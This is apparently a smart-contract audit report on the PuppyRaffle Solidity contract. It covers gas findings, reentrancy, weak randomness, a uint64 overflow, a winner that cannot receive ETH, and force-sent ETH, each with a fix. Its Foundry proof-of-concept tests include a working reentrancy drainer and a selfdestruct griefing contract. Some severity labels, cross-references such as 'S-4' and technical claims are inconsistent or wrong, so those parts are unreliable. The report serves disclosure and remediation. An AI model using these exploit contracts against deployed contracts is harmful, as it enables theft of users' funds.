# Gas Optimization Findings

### [G-01]: Unchanged State Variables should be declared as constant or immutable

Reading from storage is expensive in terms of gas. If a state variable is not expected to change after deployment, it can be declared as `constant` or `immutable`. This allows the compiler to optimize access to these variables, reducing gas costs.

Instances : 

- 'PuppyRaffle::raffleDuration' can be declared as 'immutable' since it's only set in the constructor and never changed afterwards. This can save gas by allowing the compiler to optimize access to this variable.

- 'PuppyRaffle::commonTargetUri' can also be declared as 'constant' since it's a string that is set at deployment and does not change. This can further reduce gas costs when accessing this variable.

- 'PuppyRaffle::rareImageUri' can be declared as 'constant' since it's a string that is set at deployment and does not change. This can further reduce gas costs when accessing this variable.

### [G-02]: Storage variables in a loop should be cached in memory

Accessing storage variables in a loop can be expensive in terms of gas. If the length of an array is being accessed multiple times in a loop, it can be more efficient to cache the length in a local variable before the loop starts. This way, the contract only needs to read from storage once, rather than on every iteration of the loop.

```diff 
+ uint256 length = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

### [I-01]: Unspecific Solidity Pragma

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6; //@audit q is that a good solidity version
    ```

</details>

### [I-02]: Using an outdated version of Solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see the [Solidity documentation](https://docs.soliditylang.org/en/latest/using-the-compiler.html#version-pragma) for more information on version pragmas.


### [H-01] Reentrancy in `PuppyRaffle::refund` allows attacker to drain the entire contract balance

---

**Description**

`PuppyRaffle::refund` sends ETH to `msg.sender` **before** updating the `players` array. This violates the Checks-Effects-Interactions pattern and allows a malicious contract to re-enter `PuppyRaffle::refund` repeatedly before `players[playerIndex]` is ever set to `address(0)`, draining the full contract balance.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);  // ETH sent before state update

@>  players[playerIndex] = address(0);           // State updated too late
    emit RaffleRefunded(playerAddress);
}
```

Because `players[playerIndex]` is still set to the attacker's address at the time of the external call, the `require` checks pass on every reentrant call, allowing the attacker to claim `entranceFee` repeatedly until the contract is empty.

---

**Impact**

**Severity: Critical**

- An attacker entering the raffle with a single `entranceFee` can drain the **entire contract balance** in a single transaction.
- All legitimate players lose their deposited entrance fees.
- The raffle is rendered permanently insolvent.

---

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 entranceFee;

    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _entranceFee;
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

contract PuppyRaffleReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_reentrancyRefund() public {
        // 4 legitimate players fund the contract
        address[] memory players = new address[](4);
        players[0] = makeAddr("player1");
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = makeAddr("player4");

        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        // Deploy attacker and fund with 1 entranceFee
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle, entranceFee);
        vm.deal(address(attacker), entranceFee);

        uint256 balanceBefore = address(attacker).balance;
        console.log("Attacker balance before:", balanceBefore);
        console.log("PuppyRaffle balance before:", address(puppyRaffle).balance);

        attacker.attack();

        uint256 balanceAfter = address(attacker).balance;
        console.log("Attacker balance after:", balanceAfter);
        console.log("PuppyRaffle balance after:", address(puppyRaffle).balance);

        assert(balanceAfter > entranceFee);
        assert(address(puppyRaffle).balance == 0);
    }
}
```

Expected output:
```javascript
Attacker balance before: 1000000000000000000
PuppyRaffle balance before: 5000000000000000000
Attacker balance after: 5000000000000000000
PuppyRaffle balance after: 0
```

---

**Mitigation**

Apply the **Checks-Effects-Interactions** pattern: update all state variables **before** any external call. Optionally add a `nonReentrant` modifier from OpenZeppelin for defense in depth.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // Effects before Interactions
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);

    // Interaction last
    payable(msg.sender).sendValue(entranceFee);
}
```

> **Note:** For additional protection, consider importing OpenZeppelin's `ReentrancyGuard` and adding the `nonReentrant` modifier to `PuppyRaffle::refund`. This provides a safety net against any future reentrancy vectors introduced during refactoring.



### [L-01] `PuppyRaffle::getActivePlayerIndex` returns `0` for both non-existent players and the player at index `0`, causing the first player to believe they are inactive

---

**Description**

`PuppyRaffle::getActivePlayerIndex` returns `0` when a player is not found in the `players` array. However, `0` is also the valid index of the first registered player. A caller has no way to distinguish between "player not found" and "player is at index 0", making the return value ambiguous and unreliable.

```javascript
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
@>  return 0; // Ambiguous: also the valid index of players[0]
}
```

A player at index `0` who calls this function to confirm their registration will receive `0` — identical to the value returned for an unregistered address. If the player misinterprets this as "not found", they may attempt to re-enter the raffle or mistakenly believe their entrance fee was not recorded.

---

**Impact**

**Severity: Low**

- The first registered player cannot reliably confirm their active status via `PuppyRaffle::getActivePlayerIndex`.
- No direct fund loss, but the ambiguous return value can cause incorrect off-chain or on-chain logic built on top of this function.
- Any contract or front-end relying on a `0` return to detect inactivity will produce false negatives for the player at index `0`.

---

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleAmbiguousIndexTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address firstPlayer = makeAddr("firstPlayer");
    address ghost = makeAddr("ghost"); // never entered

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_ambiguousIndexZero() public {
        address[] memory players = new address[](1);
        players[0] = firstPlayer;

        vm.deal(address(this), entranceFee);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 firstPlayerIndex = puppyRaffle.getActivePlayerIndex(firstPlayer);
        uint256 ghostIndex = puppyRaffle.getActivePlayerIndex(ghost);

        console.log("Index of firstPlayer (registered at 0):", firstPlayerIndex);
        console.log("Index of ghost (never registered):", ghostIndex);

        // Both return 0 — impossible to distinguish
        assertEq(firstPlayerIndex, ghostIndex);
    }
}
```

Expected output:
```javascript
Index of firstPlayer (registered at 0): 0
Index of ghost (never registered):      0
```

---

**Mitigation**

Use a sentinel value that can never be a valid index, or revert explicitly when the player is not found. The cleanest approach is to revert with a descriptive message:

```javascript
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not found");
}
```

> **Note:** Alternatively, return a typed `(bool found, uint256 index)` tuple so callers can always distinguish between "found at index 0" and "not found" without relying on a magic sentinel value.


### [L-02] Weak randomness in `PuppyRaffle::selectWinner` allows miners and players to predict and manipulate the winner and NFT rarity

---

**Description**

`PuppyRaffle::selectWinner` derives both the winner index and the NFT rarity from on-chain values that are either known in advance or directly controllable by miners: `msg.sender`, `block.timestamp`, and `block.difficulty`. These values are not a source of randomness — they are deterministic or manipulable, making the outcome of every raffle predictable and exploitable.

```javascript
uint256 winnerIndex =
@>  uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// ...

uint256 rarity =
@>  uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

Two distinct attack vectors exist:

**1. Player manipulation** — Any participant can simulate the `keccak256` computation off-chain using known values (`msg.sender` = their own address, `block.timestamp` = current block, `block.difficulty` = current block) and call `PuppyRaffle::selectWinner` only when the result favors them as the winner.

**2. Miner manipulation** — A miner can directly control `block.timestamp` (within the ~15s drift tolerance) and `block.difficulty`, allowing them to brute-force a winning outcome before publishing the block.

---

**Impact**

**Severity: Critical**

- A malicious player or miner can **guarantee they win** the prize pool every raffle, stealing funds from all other participants.
- NFT rarity is equally manipulable — an attacker can ensure they always mint a Legendary NFT.
- The entire fairness model of the raffle is broken; no legitimate player has a genuinely random chance of winning.

---

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleWeakRandomnessTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_weakRandomnessPredictWinner() public {
        // Fill raffle with 4 players including attacker
        address[] memory players = new address[](4);
        players[0] = makeAddr("player1");
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = attacker;

        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        // Warp to end of raffle
        vm.warp(block.timestamp + 1 days + 1);

        // Attacker simulates the exact same computation off-chain
        uint256 predictedIndex = uint256(
            keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))
        ) % 4;

        console.log("Predicted winner index:", predictedIndex);
        console.log("Attacker is at index: 3");

        // Attacker calls selectWinner only when predictedIndex == 3
        // In practice they brute-force block.timestamp until it matches
        // Here we demonstrate the prediction is deterministic
        assertEq(
            predictedIndex,
            uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4
        );
    }
}
```

Expected output:
```javascript
Predicted winner index: 3  // deterministic — attacker knows outcome before calling
Attacker is at index: 3
```

---

**Mitigation**

Replace all on-chain pseudo-randomness with **Chainlink VRF v2**, which provides cryptographically verifiable randomness that cannot be predicted or manipulated by any on-chain actor.

```javascript
// 1. Import and inherit Chainlink VRF consumer
import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";

contract PuppyRaffle is VRFConsumerBaseV2 {

    // 2. Store the VRF request ID and pending winner state
    uint256 private s_vrfRequestId;

    // 3. Request randomness instead of computing it inline
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        s_vrfRequestId = COORDINATOR.requestRandomWords(
            keyHash,
            subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            2 // request 2 random words: one for winner, one for rarity
        );
    }

    // 4. Consume randomness in the VRF callback — never in the request
    function fulfillRandomWords(uint256, uint256[] memory randomWords) internal override {
        uint256 winnerIndex = randomWords[0] % players.length;
        uint256 rarity = randomWords[1] % 100;
        // ... rest of winner logic
    }
}
```

> **Note:** Until Chainlink VRF is integrated, `block.difficulty` should also be noted as deprecated on PoS networks (post-Merge), where it always returns `0` — further degrading the entropy of the current implementation.

### [H-2] Integer overflow and unsafe `uint64` cast in `PuppyRaffle::selectWinner` causes `totalFees` to silently wrap, permanently locking protocol fees

---

**Description**

`PuppyRaffle::selectWinner` accumulates protocol fees using a `uint64` state variable. Under Solidity `^0.7.6`, arithmetic does **not** revert on overflow — values silently wrap around to `0`. Two compounding issues exist on the same line:

**1. Unsafe downcast** — `fee` is a `uint256` that can easily exceed `type(uint64).max` (`18.4 ETH`) with enough players. Casting it to `uint64` silently truncates the upper bits.

**2. Unchecked accumulation** — `totalFees` is a `uint64`. Repeatedly adding fees to it will eventually overflow and wrap back to a small value, causing the protocol to undercount — or lose entirely — accumulated fees.

```javascript
uint256 fee = (totalAmountCollected * 20) / 100;

@>  totalFees = totalFees + uint64(fee);  // unsafe cast + unchecked overflow
```

`totalFees` is later used in `PuppyRaffle::withdrawFees` to transfer the accumulated balance to `feeAddress`. If `totalFees` has wrapped to a value lower than `address(this).balance`, the `require` check in `withdrawFees` will permanently revert, trapping all fees in the contract.

```javascript
function withdrawFees() external {
@>  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

---

**Impact**

**Severity: High**

- Protocol fees silently wrap to an incorrect value after enough raffle rounds or a large enough player pool.
- `PuppyRaffle::withdrawFees` becomes permanently bricked — the `balance == totalFees` invariant is broken and can never be restored.
- All accumulated ETH fees are **permanently locked** in the contract with no recovery path.
- No direct theft, but complete and irreversible loss of protocol revenue.

---

**Proof of Concept**

`uint64` overflows once `totalFees` exceeds `18446744073709551615` (≈ 18.4 ETH). With a large enough player count, a single raffle round can overflow it in one call.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_uint64OverflowLocksWithdraw() public {
        // 100 players = 100 ETH collected, fee = 20 ETH
        // uint64 max ~= 18.4 ETH → a single round overflows totalFees
        uint256 playersCount = 100;
        address[] memory players = new address[](playersCount);
        for (uint256 i = 0; i < playersCount; i++) {
            players[i] = address(uint160(i + 1));
        }

        vm.deal(address(this), entranceFee * playersCount);
        puppyRaffle.enterRaffle{value: entranceFee * playersCount}(players);

        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        uint64 totalFees = puppyRaffle.totalFees();
        console.log("totalFees after overflow:", totalFees);

        // totalFees has wrapped — no longer equals contract balance
        // withdrawFees will now revert permanently
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

Expected output:
```javascript
totalFees after overflow: 1553255926290448384  // wrapped value, not 20 ETH
[REVERT] PuppyRaffle: There are currently players active!
```

---

**Mitigation**

Use `uint256` for `totalFees` to match the type of `fee`, eliminating both the unsafe cast and the overflow risk. Under Solidity `^0.8.0` this would revert automatically; for `^0.7.6`, upgrading the type is the safest fix.

```javascript
// Before
uint64 public totalFees = 0;

// After
uint256 public totalFees = 0;
```

Then remove the unsafe cast in `PuppyRaffle::selectWinner`:

```javascript
// Before
totalFees = totalFees + uint64(fee);

// After
totalFees = totalFees + fee;
```

> **Note:** Consider migrating to Solidity `^0.8.0` to benefit from built-in overflow protection across the entire codebase, removing the need for manual SafeMath guards entirely.

### [M-1] `PuppyRaffle::selectWinner` sends prize pool via `call` to winner without checking ETH receivability, allowing a smart contract winner without `receive`/`fallback` to permanently block raffle completion

---

**Description**

`PuppyRaffle::selectWinner` sends the prize pool to the winner using a low-level `call`. If the winning address is a smart contract that does not implement a `receive` or `fallback` function, the ETH transfer will revert. Because the `require` check is placed **after** `delete players` and `raffleStartTime` reset, the raffle state is partially updated but the round can never complete — locking the contract in a broken state.

```javascript
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;

@>      (bool success,) = winner.call{value: prizePool}("");
@>      require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
```

A malicious player can deliberately enter the raffle with a contract address that has no `receive` or `fallback`, then manipulate (see S-4) the randomness to guarantee they win. When `PuppyRaffle::selectWinner` is called, the ETH transfer fails, the `require` reverts the entire transaction, and the raffle is stuck — `players` cannot be reset, fees cannot be collected, and no new round can start.

Even without malicious intent, a legitimate player using a multisig or a contract wallet without ETH handling will accidentally trigger the same outcome.

---

**Impact**

**Severity: Medium**

- The raffle can be permanently frozen by any contract winner that cannot receive ETH.
- `delete players` and `raffleStartTime` updates are reverted along with the transaction, leaving all entrance fees locked.
- `PuppyRaffle::withdrawFees` becomes unreachable as no winner is ever finalized.
- A malicious actor can combine this with S-4 (weak randomness) to intentionally grief the protocol at will.

---

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Contract with no receive or fallback — cannot accept ETH
contract NoReceiveWinner {}

contract PuppyRaffleNoReceiveTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_contractWinnerBlocksRaffle() public {
        // Deploy a contract that cannot receive ETH
        NoReceiveWinner badWinner = new NoReceiveWinner();

        // Enter 4 players, one of which is the bad contract
        address[] memory players = new address[](4);
        players[0] = address(badWinner);
        players[1] = makeAddr("player2");
        players[2] = makeAddr("player3");
        players[3] = makeAddr("player4");

        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);

        // If badWinner is selected, selectWinner reverts entirely
        // Raffle state remains stuck — players array is never cleared
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();

        // Players array is unchanged — raffle is frozen
        assertEq(puppyRaffle.players(0), address(badWinner));
    }
}
```

Expected output:
```javascript
[REVERT] PuppyRaffle: Failed to send prize pool to winner
players[0] == address(badWinner) // state unchanged, raffle frozen
```

---

**Mitigation**

Two complementary approaches:

**1. Pull-over-push pattern (recommended)** — Instead of pushing ETH to the winner directly, record the claimable amount and let the winner pull it themselves. This fully decouples raffle completion from winner ETH receivability.

```javascript
// Add to state variables
mapping(address => uint256) public pendingWithdrawals;

// In selectWinner — replace the call with a credit
pendingWithdrawals[winner] += prizePool;
// Remove the require(success, ...) line entirely

// Add a separate claim function
function claimPrize() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "PuppyRaffle: Nothing to claim");
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "PuppyRaffle: ETH transfer failed");
}
```

**2. EOA-only winner validation** — Reject contract addresses at entry time using `extcodesize`. Note this is bypassable from a constructor call and should not be used as the sole protection.

```javascript
function enterRaffle(address[] memory newPlayers) public payable {
    for (uint256 i = 0; i < newPlayers.length; i++) {
        uint256 size;
        address p = newPlayers[i];
        assembly { size := extcodesize(p) }
        require(size == 0, "PuppyRaffle: No contract addresses");
        players.push(p);
    }
}
```

> **Note:** The pull-over-push pattern is the industry standard mitigation. It also eliminates the reentrancy surface on the prize transfer and aligns with the fix recommended in S-2.

### [M-2] Strict balance equality check in `PuppyRaffle::withdrawFees` can be permanently broken by force-sending ETH, locking all protocol fees

---

**Description**

`PuppyRaffle::withdrawFees` uses a strict equality check between `address(this).balance` and `uint256(totalFees)` to guard fee withdrawal. This assumption — that the contract balance will always equal exactly `totalFees` — can be permanently broken by force-sending ETH to the contract via `selfdestruct`.

```javascript
function withdrawFees() external {
@>  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

A contract can call `selfdestruct(payable(address(puppyRaffle)))` to forcibly push any ETH amount to `PuppyRaffle` — bypassing all `receive` and `fallback` guards. Once even `1 wei` of unaccounted ETH lands in the contract, `address(this).balance` permanently diverges from `uint256(totalFees)`, and the `require` reverts on every call to `PuppyRaffle::withdrawFees` forever.

Additionally, the same divergence can arise from:
- The integer overflow in S-5 wrapping `totalFees` to a lower value.
- The prize transfer revert in S-6 leaving entrance fees unaccounted in the balance.

This creates a compounding failure path where multiple vulnerabilities can independently trigger the same fund-locking outcome.

---

**Impact**

**Severity: Medium**

- An attacker can permanently freeze all fee withdrawals by sending as little as `1 wei` via `selfdestruct`.
- All accumulated protocol fees are **permanently locked** with no recovery path.
- The attack is cheap, irreversible, and requires no special access — any address can execute it.
- Combined with S-5 (overflow) or S-6 (no receive), the likelihood of this invariant breaking in production is very high.

---

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Attacker contract that self-destructs and force-sends ETH
contract ForceEthSender {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract PuppyRaffleMishandledEthTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
    }

    function test_forceEthBreaksWithdrawFees() public {
        // Run a normal raffle round to accumulate fees
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        vm.deal(address(this), 4 ether);
        puppyRaffle.enterRaffle{value: 4 ether}(players);

        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        console.log("totalFees:", puppyRaffle.totalFees());
        console.log("contract balance before attack:", address(puppyRaffle).balance);

        // Force-send 1 wei via selfdestruct — bypasses all ETH guards
        vm.deal(address(this), 1 wei);
        new ForceEthSender{value: 1 wei}(payable(address(puppyRaffle)));

        console.log("contract balance after attack:", address(puppyRaffle).balance);

        // withdrawFees now permanently reverts
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

Expected output:
```javascript
totalFees: 800000000000000000          // 0.8 ETH fees accumulated
contract balance before attack: 800000000000000000
contract balance after attack:  800000000000000001  // 1 wei divergence
[REVERT] PuppyRaffle: There are currently players active!
```

---

**Mitigation**

Replace the strict equality check with a `>=` comparison. This tolerates any ETH sent directly to the contract while still preventing withdrawals when active players have funds deposited.

```javascript
function withdrawFees() external {
    // Use >= instead of == to tolerate force-sent ETH
    require(
        address(this).balance >= uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

> **Note:** The root fix is to stop using `address(this).balance` as an invariant altogether. A robust implementation tracks deposited player funds in a dedicated `uint256 s_totalDeposited` variable and checks `s_totalDeposited == 0` before allowing fee withdrawal — fully decoupling the balance check from any force-sent ETH.
